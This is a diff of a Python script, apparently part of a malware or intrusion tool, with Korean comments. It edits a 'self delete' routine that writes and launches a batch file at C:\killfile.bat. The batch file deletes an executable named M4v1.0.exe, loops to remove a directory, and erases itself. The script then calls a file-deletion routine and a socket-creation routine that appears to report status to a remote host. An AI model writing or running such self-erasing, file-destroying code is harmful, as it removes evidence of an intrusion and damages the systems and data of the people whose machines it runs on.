@@ -97,14 +97,15 @@ def file_delete():
 # 3. 자가 삭제
 def self_delete():
     try:
-        f = open("C:\\users\\{}\\desktop\\killfile.bat".format(c), 'w')
+        f = open("C:\\killfile.bat".format(c), 'w')
         f.write(":Repeat\n")
-        f.write("rmdir \"C:\\users\\administrator\\desktop\\{}\n".format(dri))
+        f.write("del \"C:\\share2\\M4v1.0.exe\"\n")
+        f.write("rmdir \"C:\\{}\"\n".format(dri))
         f.write("if exist {} goto Repeat\n".format(dri))
-        f.write("del /s /q killfile.bat")
+        f.write("del /s /q \"C:\\killfile.bat\"")
         f.close()
 
-        os.startfile('C:\\users\\{}\\desktop\\killfile.bat'.format(c))
+        os.startfile('C:\\killfile.bat'.format(c))
         info_List.append(('self delete', 'Ok'))
     except:
         info_List.append(('self delete', 'No'))
@@ -114,4 +115,3 @@ def self_delete():
 file_delete()
 self_delete()
 Socket_Create()
-exit()
